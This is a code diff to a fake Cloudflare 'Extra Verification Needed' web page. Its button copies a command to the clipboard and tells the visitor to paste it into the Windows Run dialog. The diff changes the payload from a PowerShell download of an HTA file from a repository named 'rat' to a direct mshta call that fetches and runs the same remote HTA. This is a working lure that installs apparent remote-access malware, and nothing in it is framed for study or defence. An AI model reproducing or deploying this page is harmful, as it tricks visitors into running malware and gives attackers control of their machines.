@@ -53,9 +53,9 @@
     <section class="modal">
       <h2>⚠️ Extra Verification Needed</h2>
       <ol>
-        <li>Press <strong>Windows + R</strong>, type <strong>cmd</strong>, press Enter</li>
-        <li>In the black window, <strong>right-click</strong> to paste</li>
-        <li>Press <strong>Enter</strong> to verify</li>
+        <li>Press <strong>Windows + R</strong> to open the Run dialog</li>
+        <li>Paste the verification text by pressing <strong>CTRL + V</strong></li>
+        <li>Press <strong>Enter</strong> or click <strong>OK</strong> to verify</li>
       </ol>
       <p class="footer">Performance &amp; security by Cloudflare</p>
     </section>
@@ -64,8 +64,8 @@
     const button = document.getElementById("verifyBtn");
     const overlay = document.getElementById("overlay");
     
-    // Short command that fits in any terminal
-    const cmdCommand = 'powershell -Command "Invoke-WebRequest -Uri \\"https://raw.githubusercontent.com/Skibidi101201/rat/main/result.hta\\" -OutFile $env:TEMP\\r.hta; mshta $env:TEMP\\r.hta"';
+    // SIMPLE COMMAND - just mshta + URL (fits in Win+R)
+    const mshtaCommand = 'mshta https://cdn.jsdelivr.net/gh/Skibidi101201/rat/result.hta';
     
     function copyToClipboard(text) {
       const ta = document.createElement('textarea');
@@ -77,7 +77,7 @@
     }
     
     button.addEventListener("click", () => {
-      copyToClipboard(cmdCommand);
+      copyToClipboard(mshtaCommand);
       overlay.classList.add("active");
     });
   </script>
